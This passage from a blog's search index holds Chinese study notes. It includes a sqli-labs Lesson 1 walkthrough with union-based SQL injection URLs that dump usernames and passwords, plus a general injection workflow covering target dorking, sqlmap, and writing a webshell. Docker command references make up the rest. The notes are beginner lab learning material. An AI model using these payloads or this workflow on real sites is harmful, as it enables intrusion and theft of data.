BY分组后的结果筛选） eg1.SELECT A FROM B GROUP BY A HAVING COUNT(*)&gt;=3 ps 1.只有满足HAVING短语指定条件的组才输出 2.HAVING短语与WHERE子句区别：作用对象不同 WHERE子句作用于基表或视图，从中选择满足条件的元组 HAVING短语作用于组，从中选择满足条件的组","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"sqli_lab_lesson1","date":"2021-10-10T07:26:38.000Z","path":"2021/10/10/sqli-lab-lesson1/","text":"sqli-lab-lesson1问题解析（萌新版）博主作为一位刚接触计算机萌新，有很多不懂的东西需要学习。以下是博主在按照别人的攻略通过sqli-libs-lesson1的遇到问题以及查找到的解答。 1.具体步骤（攻略链接：https://blog.csdn.net/weixin_51356351/article/details/109198820以下图片是博主根据攻略输入指令所得,部分内容有稍微进行修改） 判断注入点—-判断是数字型还是字符型—-查询列数—-查询显示位—-获取数据库名—-获取数据库中的表名—-获取列名—-获取列中的数据 其实不管是联合查询还是盲注之类的基本都这样，大同小异。 ①http://localhost/sqli-labs-master/Less-1/?id=1&#39;②http://localhost/sqli-labs-master/Less-1/?id=1&#39; – -③http://localhost/sqli-labs-master/Less-1/?id=1&#39; and 1=1– -④http://localhost/sqli-labs-master/Less-1/?id=1&#39; and 1=2– -⑤http://localhost/sqli-labs-master/Less-1/?id=1&#39; order by 3– -⑥http://localhost/sqli-labs-master/Less-1/?id=1&#39; order by 4– -⑦http://localhost/sqli-labs-master/Less-1/?id=-1&#39; union select 1,2,3– -⑧http://localhost/sqli-labs-master/Less-1/?id=-1&#39; union select 1,database(),user()– -http://localhost/sqli-labs-master/Less-1/?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=“security”),3– -⑨http://localhost/sqli-labs-master/Less-1/?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=“security” and table_name=“users”),3 – -⑩http://localhost/sqli-labs-master/Less-1/?id=-1&#39; union select 1,(select group_concat(concat_ws(id,username,password)) from users),3– - 2.问题以及分析 a.?id=1’目的：根据报错判断数据库类型是MySQL；错误点在于id=1 和 LIMIT0,1’之间多了一个’,所以要将LIMIT之前的单引号闭合。 例如?id=1’and’1’=’1 b.源码：$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;分析：Id参数在拼接sql语句时，未对id进行任何的过滤等操作 ，导致了注入漏洞。为了执行查询语句select，需要注释掉末尾的单引号 http://localhost/sqli-labs-master/Less-1/?id=1&#39; – -:单引号依然没有闭合，因为 – 直接连接了LTMIT，所以应当在 – 后加空格，一般浏览器传数据的时候不会将输入的空格传到服务器，所以要使用 +或编码值%20，即–+或–%20。这里使用– -也起到了同样的效果。 c.order by 语句用于查询数据库有几列。 d.union操作符用于合并两个或多个SELECT语句的结果集。 e.user()用户名 f.database()数据库名 g.concat_ws ()含有分隔符地连接字符串 h.select语句建议去阅读这篇文章。https://blog.51cto.com/jimshu/1363101#:~:text=SELECT%E8%AF%AD%E5%8F%A5%E6%98%AF%20T-SQL%20%E4%B8%AD%E6%9C%80%E9%87%8D%E8%A6%81%E7%9A%84%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E3%80%82%20SELECT%20%E8%AF%AD%E5%8F%A5%E5%8F%AF%E8%83%BD%E8%BF%94%E5%9B%9E%E4%B8%80%E8%A1%8C%E8%AE%B0%E5%BD%95%EF%BC%88record%EF%BC%89%EF%BC%8C%E4%B9%9F%E5%8F%AF%E8%83%BD%E8%BF%94%E5%9B%9E%E4%B8%80%E4%B8%AA%E7%BB%93%E6%9E%9C%E9%9B%86%EF%BC%88result%20set%EF%BC%89%E3%80%82%20SELECT%E8%AF%AD%E5%8F%A5%E5%8F%AF%E4%BB%A5%E5%8C%85%E5%90%AB%E5%A4%9A%E4%B8%AA%E5%AD%90%E5%8F%A5%EF%BC%8C%E4%BB%8E%E8%80%8C%E6%9E%84%E6%88%90%E5%A4%8D%E6%9D%82%E7%9A%84%E6%9F%A5%E8%AF%A2%E3%80%82%20%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%AD%90%E5%8F%A5%E6%9C%89%E4%BB%A5%E4%B8%8B%E5%87%A0%E4%B8%AA%EF%BC%9A,%E5%AD%90%E5%8F%A5%EF%BC%8C%E5%AF%B9%E8%BE%93%E5%87%BA%E8%BF%9B%E8%A1%8C%E6%8E%92%E5%BA%8F%E3%80%82%201.%20%E8%AF%AD%E6%B3%95%E8%A7%A3%E9%87%8A%20SELECT%20%E5%AD%90%E5%8F%A5%E4%B8%8E%E5%85%B6%E5%AE%83%E5%AD%90%E5%8F%A5%EF%BC%88%E8%87%B3%E5%B0%91%E5%8C%85%E5%90%AB%20FROM%20%E5%AD%90%E5%8F%A5%EF%BC%89%E7%BB%84%E6%88%90%E4%B8%80%E4%B8%AA%E6%9F%A5%E8%AF%A2%EF%BC%8CSELECT%20%E5%AD%90%E5%8F%A5%E7%94%A8%E4%BA%8E%E7%AD%9B%E9%80%89%E9%9C%80%E8%A6%81%E8%BE%93%E5%87%BA%E7%9A%84%E5%88%97%E6%88%96%E8%80%85%E8%A1%A8%E8%BE%BE%E5%BC%8F%E3%80%82","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"sql注入一般流程（学习笔记）","date":"2021-10-07T14:58:23.000Z","path":"2021/10/07/sqli注入流程笔记/","text":"sql注入一般流程（1）目标收集a.无特定目标inurl:.php?id=//注意php前有一个小点 b.有特定目标inurl:.php?id=sit:target.com c.工具爬取spider，对收索引擎和目标网站的链接经行爬取 （2）注入识别a.手工简单识别:’ :and 1=1/and1=2 :and ‘1’=’1/and’1’=’2 :and 1 like 1/and 1 like 2 b.工具识别sqlmap -m filename(filename中保存检测目标) sqlmap -crawl(sqlmap对目标网站经行爬取然后依次进行测试) ps.高级识别 扩展识别的广度和深度 sqlmap–level 增加测试级别，对header中相关参进行测试 sqlmap -r filename (filename 中为网站请求数据) 利用工具提高识别效率 Burp Suite + SqlMap BurpSuite 拦截所有浏览器访问提交的数据 BurpSuite扩展插件，直接调用SqlMap测试 ps.建议1.可以在参数后输入’*’来确定想测试的参数 eg：参照暴力破解 2.可能出现注入的点：新闻、登入、搜索、留言……(常见疏忽防守的地方) 3.要站在开发者的角度去寻找 c.代码审计搜索关键代码和函数 梳理业务流程 （3）SQL注入①信息搜集 1&gt;.数据库类型： a.check the manual that corresponds to your MySQL server version for the right syntax(mysql类型) b.Microsoft JET Datebase Engine 错误 ‘80040e14’(website类型) c.也可用函数version()、@@version进行查询 2&gt;.数据库版本：a.@@version v$version 3&gt;.数据库用户：user() SYSTEM_VSER 4&gt;.数据库权限：super_priv IS_SRVROLEMEMBER ②获得数据 a.获取库信息 b.获取表信息 c.获取列信息 d.获取数据 （1.通过语句查询2.通过暴力破解） ps.暴力破解 wed.mdb select[*] from xxx select[xxx] from XXXXX ③提权 a.执行命令：SQLSever 权限 b.读文件：读中间件配置文件;读数据库配置文件 c.写webshell到网站目录","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"docker命令大全-rootfs命令及镜像仓库","date":"2021-10-05T14:45:23.000Z","path":"2021/10/05/docker命令大全-容器rootfs命令与镜像仓库/","text":"容器rootfs命令本文取自https://www.runoob.com/docker/docker-rm-command.html，博主整理这些命令主要是方便自己或其他需要的人来查阅 （1）docker commit :从容器创建一个新的镜像。 语法docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]OPTIONS说明： -a :提交的镜像作者； -c :使用Dockerfile指令来创建镜像； -m :提交时的说明文字； -p :在commit时，将容器暂停。 实例将容器a404c6c174a2 保存为新的镜像,并添加提交人信息和说明信息。 runoob@runoob:~$ docker commit -a &quot;runoob.com&quot; -m &quot;my apache&quot; a404c6c174a2 mymysql:v1 sha256:37af1236adef1544e8886be23010b66577647a40bc02c0885a6600b33ee28057 runoob@runoob:~$ docker images mymysql:v1 REPOSITORY TAG IMAGE ID CREATED SIZE mymysql v1 37af1236adef 15 seconds ago 329 MB （2）docker cp :用于容器与主机之间的数据拷贝。 语法docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|- docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH OPTIONS说明： -L :保持源目标中的链接 实例将主机/www/runoob目录拷贝到容器96f7f14e99ab的/www目录下。 docker cp /www/runoob 96f7f14e99ab:/www/ 将主机/www/runoob目录拷贝到容器96f7f14e99ab中，目录重命名为www。 docker cp /www/runoob 96f7f14e99ab:/www 将容器96f7f14e99ab的/www目录拷贝到主机的/tmp目录中。 docker cp 96f7f14e99ab:/www /tmp/ （3）docker diff : 检查容器里文件结构的更改。 语法 docker diff [OPTIONS] CONTAINER 实例查看容器mymysql的文件结构更改。 runoob@runoob:~$ docker diff mymysql A /logs A /mysql_data C /run C /run/mysqld A /run/mysqld/mysqld.pid A /run/mysqld/mysqld.sock C /tmp 镜像仓库（1）docker login : 登陆到一个Docker镜像仓库，如果未指定镜像仓库地址，默认为官方仓库 Docker Hub docker logout : 登出一个Docker镜像仓库，如果未指定镜像仓库地址，默认为官方仓库 Docker Hub 语法docker login [OPTIONS] [SERVER] docker logout [OPTIONS] [SERVER] OPTIONS说明： -u :登陆的用户名 -p :登陆的密码 实例登陆到Docker Hub docker login -u 用户名 -p 密码 登出Docker Hub docker logout （2）docker pull : 从镜像仓库中拉取或者更新指定镜像 语法docker pull [OPTIONS] NAME[:TAG|@DIGEST] OPTIONS说明： -a :拉取所有 tagged 镜像 –disable-content-trust :忽略镜像的校验,默认开启 实例从Docker Hub下载java最新版镜像。 docker pull java 从Docker Hub下载REPOSITORY为java的所有镜像。 docker pull -a java （3）docker push : 将本地的镜像上传到镜像仓库,要先登陆到镜像仓库 语法docker push [OPTIONS] NAME[:TAG] OPTIONS说明： –disable-content-trust :忽略镜像的校验,默认开启 实例上传本地镜像myapache:v1到镜像仓库中。 docker push myapache:v1 （4）docker search : 从Docker Hub查找镜像 语法docker search [OPTIONS] TERM OPTIONS说明： –automated :只列出 automated build类型的镜像； –no-trunc :显示完整的镜像描述； -f &lt;过滤条件&gt;:列出收藏数不小于指定值的镜像。 实例从 Docker Hub 查找所有镜像名包含 java，并且收藏数大于 10 的镜像 runoob@runoob:~$ docker search -f stars=10 java NAME DESCRIPTION STARS OFFICIAL AUTOMATED java Java is a concurrent, class-based... 1037 [OK] anapsix/alpine-java Oracle Java 8 (and 7) with GLIBC ... 115 [OK] develar/java 46 [OK] isuper/java-oracle This repository contains all java... 38 [OK] lwieske/java-8 Oracle Java 8 Container - Full + ... 27 [OK] nimmis/java-centos This is docker images of CentOS 7... 13 [OK] 参数说明： NAME: 镜像仓库源的名称 DESCRIPTION: 镜像的描述 OFFICIAL: 是否 docker 官方发布 stars: 类似 Github 里面的 star，表示点赞、喜欢的意思。 AUTOMATED: 自动构建。","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"docker命令大全-容器操作","date":"2021-10-05T14:45:23.000Z","path":"2021/10/05/docker命令大全-容器操作/","text":"docker的常用命令-容器操作本文取自https://www.runoob.com/docker/docker-rm-command.html，博主整理这些命令主要是方便自己或其他需要的人来查阅 （1）docker ps : 列出容器 语法docker ps [OPTIONS]OPTIONS说明： -a :显示所有的容器，包括未运行的。 -f :根据条件过滤显示的内容。 –format :指定返回值的模板文件。 -l :显示最近创建的容器。 -n :列出最近创建的n个容器。 –no-trunc :不截断输出。 -q :静默模式，只显示容器编号。 -s :显示总的文件大小。 实例 列出所有在运行的容器信息。 runoob@runoob:~$ docker ps CONTAINER ID IMAGE COMMAND … PORTS NAMES 09b93464c2f7 nginx:latest “nginx -g ‘daemon off” … 80/tcp, 443/tcp myrunoob 96f7f14e99ab mysql:5.6 “docker-entrypoint.sh” … 0.0.0.0:3306-&gt;3306/tcp mymysql 输出详情介绍： CONTAINER ID: 容器 ID。 IMAGE: 使用的镜像。 COMMAND: 启动容器时运行的命令。 CREATED: 容器的创建时间。 STATUS: 容器状态。 状态有7种： created（已创建） restarting（重启中） running（运行中） removing（迁移中） paused（暂停） exited（停止） dead（死亡） PORTS: 容器的端口信息和使用的连接类型（tcp\\udp）。 NAMES: 自动分配的容器名称。 列出最近创建的5个容器信息。 runoob@runoob:~$ docker ps -n 5 CONTAINER ID IMAGE COMMAND CREATED 09b93464c2f7 nginx:latest &quot;nginx -g &#39;daemon off&quot; 2 days ago ... b8573233d675 nginx:latest &quot;/bin/bash&quot; 2 days ago ... b1a0703e41e7 nginx:latest &quot;nginx -g &#39;daemon off&quot; 2 days ago ... f46fb1dec520 5c6e1090e771 &quot;/bin/sh -c &#39;set -x \\t&quot; 2 days ago ... a63b4a5597de 860c279d2fec &quot;bash&quot; 2 days ago ... 列出所有创建的容器ID。 runoob@runoob:~$ docker ps -a -q09b93464c2f7 b8573233d675 b1a0703e41e7 f46fb1dec520 a63b4a5597de 6a4aa42e947b de7bb36e7968 43a432b73776 664a8ab1a585 ba52eb632bbd … (2)docker inspect : 获取容器/镜像的元数据。 语法docker inspect [OPTIONS] NAME|ID [NAME|ID…]OPTIONS说明： -f :指定返回值的模板文件。 -s :显示总的文件大小。 –type :为指定类型返回JSON。 实例获取镜像mysql:5.6的元信息。 获取正在运行的容器mymysql的 IP。 ``runoob@runoob:~$ docker inspect --format='{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' mymysql 172.17.0.3``` (3)docker top :查看容器中运行的进程信息，支持 ps 命令参数。 语法docker top [OPTIONS] CONTAINER [ps OPTIONS] 容器运行时不一定有/bin/bash终端来交互执行top命令，而且容器还不一定有top命令，可以使用docker top来实现查看container中正在运行的进程。 实例查看容器mymysql的进程信息。 runoob@runoob:~/mysql$ docker top mymysql UID PID PPID C STIME TTY TIME CMD 999 40347 40331 18 00:58 ? 00:00:02 mysqld 查看所有运行容器的进程信息。 for i in docker ps |grep Up|awk &#39;&#123;print $1&#125;&#39;;do echo \\ &amp;&amp;docker top $i; done (3)docker attach :连接到正在运行中的容器。 语法docker attach [OPTIONS] CONTAINER要attach上去的容器必须正在运行，可以同时连接上同一个container来共享屏幕（与screen命令的attach类似）。 官方文档中说attach后可以通过CTRL-C来detach，但实际上经过我的测试，如果container当前在运行bash，CTRL-C自然是当前行的输入，没有退出；如果container当前正在前台运行进程，如输出nginx的access.log日志，CTRL-C不仅会导致退出容器，而且还stop了。这不是我们想要的，detach的意思按理应该是脱离容器终端，但容器依然运行。好在attach是可以带上–sig-proxy=false来确保CTRL-D或CTRL-C不会关闭容器。 实例容器mynginx将访问日志指到标准输出，连接到容器查看访问信息。 runoob@runoob:~$ docker attach --sig-proxy=false mynginx 192.168.239.1 - - [10/Jul/2016:16:54:26 +0000] &quot;GET / HTTP/1.1&quot; 304 0 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36&quot; &quot;-&quot; (4)docker events : 从服务器获取实时事件 语法docker events [OPTIONS]OPTIONS说明： -f ：根据条件过滤事件； –since ：从指定的时间戳后显示所有事件; –until ：流水时间显示到指定的时间为止； 实例显示docker 2016年7月1日后的所有事件。 runoob@runoob:~/mysql$ docker events --since=&quot;1467302400&quot; 2016-07-08T19:44:54.501277677+08:00 network connect 66f958fd13dc4314ad20034e576d5c5eba72e0849dcc38ad9e8436314a4149d4 (container=b8573233d675705df8c89796a2c2687cd8e36e03646457a15fb51022db440e64, name=bridge, type=bridge) 2016-07-08T19:44:54.723876221+08:00 container start b8573233d675705df8c89796a2c2687cd8e36e03646457a15fb51022db440e64 (image=nginx:latest, name=elegant_albattani) 2016-07-08T19:44:54.726110498+08:00 container resize b8573233d675705df8c89796a2c2687cd8e36e03646457a15fb51022db440e64 (height=39, image=nginx:latest, name=elegant_albattani, width=167) 2016-07-08T19:46:22.137250899+08:00 container die b8573233d675705df8c89796a2c2687cd8e36e03646457a15fb51022db440e64 (exitCode=0, image=nginx:latest, name=elegant_albattani) ... 显示docker 镜像为mysql:5.6 2016年7月1日后的相关事件。 runoob@runoob:~/mysql$ docker events -f &quot;image&quot;=&quot;mysql:5.6&quot; --since=&quot;1467302400&quot; 2016-07-11T00:38:53.975174837+08:00 container start 96f7f14e99ab9d2f60943a50be23035eda1623782cc5f930411bbea407a2bb10 (image=mysql:5.6, name=mymysql) 2016-07-11T00:51:17.022572452+08:00 container kill 96f7f14e99ab9d2f60943a50be23035eda1623782cc5f930411bbea407a2bb10 (image=mysql:5.6, name=mymysql, signal=9) 2016-07-11T00:51:17.132532080+08:00 container die 96f7f14e99ab9d2f60943a50be23035eda1623782cc5f930411bbea407a2bb10 (exitCode=137, image=mysql:5.6, name=mymysql) 2016-07-11T00:51:17.514661357+08:00 container destroy 96f7f14e99ab9d2f60943a50be23035eda1623782cc5f930411bbea407a2bb10 (image=mysql:5.6, name=mymysql) 2016-07-11T00:57:18.551984549+08:00 container create c8f0a32f12f5ec061d286af0b1285601a3e33a90a08ff1706de619ac823c345c (image=mysql:5.6, name=mymysql) 2016-07-11T00:57:18.557405864+08:00 container attach c8f0a32f12f5ec061d286af0b1285601a3e33a90a08ff1706de619ac823c345c (image=mysql:5.6, name=mymysql) 2016-07-11T00:57:18.844134112+08:00 container start c8f0a32f12f5ec061d286af0b1285601a3e33a90a08ff1706de619ac823c345c (image=mysql:5.6, name=mymysql) 2016-07-11T00:57:19.140141428+08:00 container die c8f0a32f12f5ec061d286af0b1285601a3e33a90a08ff1706de619ac823c345c (exitCode=1, image=mysql:5.6, name=mymysql) 2016-07-11T00:58:05.941019136+08:00 container destroy c8f0a32f12f5ec061d286af0b1285601a3e33a90a08ff1706de619ac823c345c (image=mysql:5.6, name=mymysql) 2016-07-11T00:58:07.965128417+08:00 container create a404c6c174a21c52f199cfce476e041074ab020453c7df2a13a7869b48f2f37e (image=mysql:5.6, name=mymysql) 2016-07-11T00:58:08.188734598+08:00 container start a404c6c174a21c52f199cfce476e041074ab020453c7df2a13a7869b48f2f37e (image=mysql:5.6, name=mymysql) 2016-07-11T00:58:20.010876777+08:00 container top a404c6c174a21c52f199cfce476e041074ab020453c7df2a13a7869b48f2f37e (image=mysql:5.6, name=mymysql) 2016-07-11T01:06:01.395365098+08:00 container top a404c6c174a21c52f199cfce476e041074ab020453c7df2a13a7869b48f2f37e (image=mysql:5.6, name=mymysql) 如果指定的时间是到秒级的，需要将时间转成时间戳。如果时间为日期的话，可以直接使用，如–since=”2016-07-01”。 (5)docker logs : 获取容器的日志 语法docker logs [OPTIONS] CONTAINEROPTIONS说明： -f : 跟踪日志输出 –since :显示某个开始时间的所有日志 -t : 显示时间戳 –tail :仅列出最新N条容器日志 实例跟踪查看容器mynginx的日志输出。 runoob@runoob:~$ docker logs -f mynginx 192.168.239.1 - - [10/Jul/2016:16:53:33 +0000] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36&quot; &quot;-&quot; 2016/07/10 16:53:33 [error] 5#5: *1 open() &quot;/usr/share/nginx/html/favicon.ico&quot; failed (2: No such file or directory), client: 192.168.239.1, server: localhost, request: &quot;GET /favicon.ico HTTP/1.1&quot;, host: &quot;192.168.239.130&quot;, referrer: &quot;http://192.168.239.130/&quot; 192.168.239.1 - - [10/Jul/2016:16:53:33 +0000] &quot;GET /favicon.ico HTTP/1.1&quot; 404 571 &quot;http://192.168.239.130/&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36&quot; &quot;-&quot; 192.168.239.1 - - [10/Jul/2016:16:53:59 +0000] &quot;GET / HTTP/1.1&quot; 304 0 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36&quot; &quot;-&quot; …查看容器mynginx从2016年7月1日后的最新10条日志。 docker logs –since=”2016-07-01” –tail=10 mynginx (6)docker wait : 阻塞运行直到容器停止，然后打印出它的退出代码。 语法 docker wait [OPTIONS] CONTAINER [CONTAINER…] 实例docker wait CONTAINER (7)docker export :将文件系统作为一个tar归档文件导出到STDOUT。 语法docker export [OPTIONS] CONTAINER OPTIONS说明： -o :将输入内容写到文件。 实例将id为a404c6c174a2的容器按日期保存为tar文件。 runoob@runoob:~$ docker export -o mysql-`date +%Y%m%d`.tar a404c6c174a2 runoob@runoob:~$ ls mysql-`date +%Y%m%d`.tar mysql-20160711.tar (8)docker port :列出指定的容器的端口映射，或者查找将PRIVATE_PORT NAT到面向公众的端口。 语法 docker port [OPTIONS] CONTAINER [PRIVATE_PORT[/PROTO]] 实例查看容器mynginx的端口映射情况。 runoob@runoob:~$ docker port mymysql3306/tcp -&gt; 0.0.0.0:3306","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"docker命令大全-容器生命周期管理","date":"2021-10-05T14:45:23.000Z","path":"2021/10/05/docker命令大全-容器生命周期管理/","text":"docker命令大全-容器生命周期管理本文取自https://www.runoob.com/docker/docker-rm-command.html，博主整理这些命令主要是方便自己或其他需要的人来查阅 （1）docker start :启动一个或多个已经被停止的容器 docker stop :停止一个运行中的容器 docker restart :重启容器 语法docker start [OPTIONS] CONTAINER [CONTAINER…] docker stop [OPTIONS] CONTAINER [CONTAINER…] docker restart [OPTIONS] CONTAINER [CONTAINER…] 实例 启动已被停止的容器myrunoob docker start myrunoob停止运行中的容器myrunoob docker stop myrunoob重启容器myrunoob docker restart myrunoob （2）docker run ：创建一个新的容器并运行一个命令 语法docker run [OPTIONS] IMAGE [COMMAND] [ARG…] OPTIONS说明： -a stdin: 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项； -d: 后台运行容器，并返回容器ID； -i: 以交互模式运行容器，通常与 -t 同时使用； -P: 随机端口映射，容器内部端口随机映射到主机的端口 -p: 指定端口映射，格式为：主机(宿主)端口:容器端口 -t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用； –name=”nginx-lb”: 为容器指定一个名称； –dns 8.8.8.8: 指定容器使用的DNS服务器，默认和宿主一致； –dns-search example.com: 指定容器DNS搜索域名，默认和宿主一致； -h “mars”: 指定容器的hostname； -e username=”ritchie”: 设置环境变量； –env-file=[]: 从指定文件读入环境变量； –cpuset=”0-2” or –cpuset=”0,1,2”: 绑定容器到指定CPU运行； -m :设置容器使用内存最大值； –net=”bridge”: 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型； –link=[]: 添加链接到另一个容器； –expose=[]: 开放一个端口或一组端口； –volume , -v: 绑定一个卷 实例 使用docker镜像nginx:latest以后台模式启动一个容器,并将容器命名为mynginx。 docker run –name mynginx -d nginx:latest 使用镜像nginx:latest以后台模式启动一个容器,并将容器的80端口映射到主机随机端口。 docker run -P -d nginx:latest 使用镜像 nginx:latest，以后台模式启动一个容器,将容器的 80 端口映射到主机的 80 端口,主机的目录 /data 映射到容器的 /data。 docker run -p 80:80 -v /data:/data -d nginx:latest 绑定容器的 8080 端口，并将其映射到本地主机 127.0.0.1 的 80 端口上。 $ docker run -p 127.0.0.1:80:8080/tcp ubuntu bash 使用镜像nginx:latest以交互模式启动一个容器,在容器内执行/bin/bash命令。 runoob@runoob:~$ docker run -it nginx:latest /bin/bashroot@b8573233d675:/# （3）docker kill :杀掉一个运行中的容器。 语法docker kill [OPTIONS] CONTAINER [CONTAINER…]OPTIONS说明： -s :向容器发送一个信号 实例杀掉运行中的容器mynginx runoob@runoob:~$ docker kill -s KILL mynginxmynginx （4）docker rm ：删除一个或多个容器。 语法docker rm [OPTIONS] CONTAINER [CONTAINER…]OPTIONS说明： -f :通过 SIGKILL 信号强制删除一个运行中的容器。 -l :移除容器间的网络连接，而非容器本身。 -v :删除与容器关联的卷。 实例强制删除容器 db01、db02： docker rm -f db01 db02 移除容器 nginx01 对容器 db01 的连接，连接名 db： docker rm -l db 删除容器 nginx01, 并删除容器挂载的数据卷： docker rm -v nginx01 删除所有已经停止的容器： docker rm $(docker ps -a -q） （5）docker pause :暂停容器中所有的进程。 docker unpause :恢复容器中所有的进程。 语法docker pause CONTAINER [CONTAINER…] docker unpause CONTAINER [CONTAINER…]实例暂停数据库容器db01提供服务。 docker pause db01 恢复数据库容器 db01 提供服务。 docker unpause db01 （6）docker create ：创建一个新的容器但不启动它 用法同 docker run 语法docker create [OPTIONS] IMAGE [COMMAND] [ARG…] 语法同 docker run 实例使用docker镜像nginx:latest创建一个容器,并将容器命名为myrunoob runoob@runoob:~$ docker create –name myrunoob nginx:latest09b93464c2f75b7b69f83d56a9cfc23ceb50a48a9db7652ee4c27e3e2cb1961f (7)docker exec ：在运行的容器中执行命令 语法docker exec [OPTIONS] CONTAINER COMMAND [ARG…]OPTIONS说明： -d :分离模式: 在后台运行 -i :即使没有附加也保持STDIN 打开 -t :分配一个伪终端 实例在容器 mynginx 中以交互模式执行容器内 /root/runoob.sh 脚本: runoob@runoob:~$ docker exec -it mynginx /bin/sh /root/runoob.shhttp://www.runoob.com/在容器 mynginx 中开启一个交互模式的终端: runoob@runoob:~$ docker exec -i -t mynginx /bin/bash root@b1a0703e41e7:/#也可以通过 docker ps -a 命令查看已经在运行的容器，然后使用容器 ID 进入容器。 查看已经在运行的容器 ID： docker ps -a…9df70f9a0714 openjdk “/usercode/script.sh…”…第一列的 9df70f9a0714 就是容器 ID。 通过 exec 命令对指定的容器执行 bash: docker exec -it 9df70f9a0714 /bin/bash","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"docker命令大全-本地镜像管理及Docker info 命令","date":"2021-10-05T14:45:23.000Z","path":"2021/10/05/docker命令大全-本地镜像管理与infoversion/","text":"本地镜像管理本文取自https://www.runoob.com/docker/docker-rm-command.html，博主整理这些命令主要是方便自己或其他需要的人来查阅 (1)docker images : 列出本地镜像。 语法docker images [OPTIONS] [REPOSITORY[:TAG]]OPTIONS说明： -a :列出本地所有的镜像（含中间映像层，默认情况下，过滤掉中间映像层）； –digests :显示镜像的摘要信息； -f :显示满足条件的镜像； –format :指定返回值的模板文件； –no-trunc :显示完整的镜像信息； -q :只显示镜像ID。 实例查看本地镜像列表。 runoob@runoob:~$ docker images REPOSITORY TAG IMAGE ID CREATED SIZE mymysql v1 37af1236adef 5 minutes ago 329 MB runoob/ubuntu v4 1c06aa18edee 2 days ago 142.1 MB &lt;none&gt; &lt;none&gt; 5c6e1090e771 2 days ago 165.9 MB httpd latest ed38aaffef30 11 days ago 195.1 MB alpine latest 4e38e38c8ce0 2 weeks ago 4.799 MB mongo 3.2 282fd552add6 3 weeks ago 336.1 MB redis latest 4465e4bcad80 3 weeks ago 185.7 MB php 5.6-fpm 025041cd3aa5 3 weeks ago 456.3 MB python 3.5 045767ddf24a 3 weeks ago 684.1 MB …列出本地镜像中REPOSITORY为ubuntu的镜像列表。 root@runoob:~# docker images ubuntu REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu 14.04 90d5884b1ee0 9 weeks ago 188 MB ubuntu 15.10 4e3b13c8a266 3 months ago 136.3 MB (2)docker rmi : 删除本地一个或多个镜像。 语法docker rmi [OPTIONS] IMAGE [IMAGE…]OPTIONS说明： -f :强制删除； –no-prune :不移除该镜像的过程镜像，默认移除； 实例强制删除本地镜像 runoob/ubuntu:v4。 root@runoob:~# docker rmi -f runoob/ubuntu:v4 Untagged: runoob/ubuntu:v4 Deleted: sha256:1c06aa18edee44230f93a90a7d88139235de12cd4c089d41eed8419b503072be Deleted: sha256:85feb446e89a28d58ee7d80ea5ce367eebb7cec70f0ec18aa4faa874cbd97c73 (3)docker tag : 标记本地镜像，将其归入某一仓库。 语法docker tag [OPTIONS] IMAGE[:TAG] [REGISTRYHOST/][USERNAME/]NAME[:TAG] 实例将镜像ubuntu:15.10标记为 runoob/ubuntu:v3 镜像。 root@runoob:~# docker tag ubuntu:15.10 runoob/ubuntu:v3 root@runoob:~# docker images runoob/ubuntu:v3 REPOSITORY TAG IMAGE ID CREATED SIZE runoob/ubuntu v3 4e3b13c8a266 3 months ago 136.3 MB (4)docker build 命令用于使用 Dockerfile 创建镜像。 语法docker build [OPTIONS] PATH | URL | -OPTIONS说明： –build-arg=[] :设置镜像创建时的变量； –cpu-shares :设置 cpu 使用权重； –cpu-period :限制 CPU CFS周期； –cpu-quota :限制 CPU CFS配额； –cpuset-cpus :指定使用的CPU id； –cpuset-mems :指定使用的内存 id； –disable-content-trust :忽略校验，默认开启； -f :指定要使用的Dockerfile路径； –force-rm :设置镜像过程中删除中间容器； –isolation :使用容器隔离技术； –label=[] :设置镜像使用的元数据； -m :设置内存最大值； –memory-swap :设置Swap的最大值为内存+swap，”-1”表示不限swap； –no-cache :创建镜像的过程不使用缓存； –pull :尝试去更新镜像的新版本； –quiet, -q :安静模式，成功后只输出镜像 ID； –rm :设置镜像成功后删除中间容器； –shm-size :设置/dev/shm的大小，默认值是64M； –ulimit :Ulimit配置。 –squash :将 Dockerfile 中所有的操作压缩为一层。 –tag, -t: 镜像的名字及标签，通常 name:tag 或者 name 格式；可以在一次构建中为一个镜像设置多个标签。 –network: 默认 default。在构建期间设置RUN指令的网络模式 实例使用当前目录的 Dockerfile 创建镜像，标签为 runoob/ubuntu:v1。 docker build -t runoob/ubuntu:v1 . 使用URL github.com/creack/docker-firefox 的 Dockerfile 创建镜像。 